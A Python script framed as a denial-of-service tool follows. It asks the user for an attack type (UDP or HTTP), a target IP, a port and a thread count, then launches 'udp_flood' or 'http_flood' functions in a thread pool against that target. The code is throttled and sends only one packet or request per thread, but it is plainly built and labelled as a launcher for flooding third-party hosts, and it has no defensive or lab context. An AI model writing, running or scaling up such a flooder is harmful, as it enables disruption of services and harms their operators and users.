import socket
import requests
from concurrent.futures import ThreadPoolExecutor
import ipaddress
from time import sleep
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

def validate_attack_type(attack_type):
    return attack_type in ('udp', 'http')

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def validate_port(port):
    return 1 <= port <= 65535

def validate_num_threads(num_threads):
    return num_threads > 0

def create_session():
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def udp_flood(target_ip, target_port):
    print(f"Sending UDP packet to {target_ip}:{target_port}")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(5)  # Add timeout
            sock.sendto(b'Hello, World!', (target_ip, target_port))
            sleep(0.1)  # Rate limiting
    except socket.timeout:
        print("Connection timed out")
    except Exception as e:
        print(f"Error sending UDP packet: {e}")

def http_flood(target_ip, target_port):
    target_url = f"http://{target_ip}:{target_port}"
    print(f"Sending HTTP request to {target_url}")
    try:
        session = create_session()
        response = session.get(target_url, timeout=5)
        print(f"HTTP Response Code: {response.status_code}")
        sleep(0.1)  # Rate limiting
    except requests.exceptions.Timeout:
        print("Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"Error sending HTTP request: {e}")

def start_attack(attack_type, target_ip, target_port, num_threads):
    if not validate_attack_type(attack_type) or not validate_ip(target_ip) or not validate_port(target_port):
        print("Invalid parameters")
        return

    max_threads = 50  # Limit maximum threads
    num_threads = min(num_threads, max_threads)

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        tasks = []
        if attack_type == 'udp':
            for _ in range(num_threads):
                tasks.append(executor.submit(udp_flood, target_ip, target_port))
        elif attack_type == 'http':
            for _ in range(num_threads):
                tasks.append(executor.submit(http_flood, target_ip, target_port))

        # Wait for all threads to complete
        for task in tasks:
            task.result()

def get_validated_input():
    try:
        attack_type = input("Choose attack type (udp/http): ").lower()
        if not validate_attack_type(attack_type):
            print("Invalid attack type selected.")
            return None
            
        target_ip = input("Enter target IP address: ")
        if not validate_ip(target_ip):
            print("Invalid IP address format.")
            return None

        target_port = int(input("Enter target port: "))
        if not validate_port(target_port):
            print("Invalid port number. Port must be between 1 and 65535.")
            return None

        num_threads = int(input("Enter number of threads: "))
        if not validate_num_threads(num_threads):
            print("Number of threads must be a positive integer.")
            return None

        return {
            'attack_type': attack_type,
            'target_ip': target_ip,
            'target_port': target_port,
            'num_threads': num_threads
        }
    except ValueError as e:
        print(f"Invalid input: {e}")
        return None

params = get_validated_input()
if params:
    start_attack(**params)
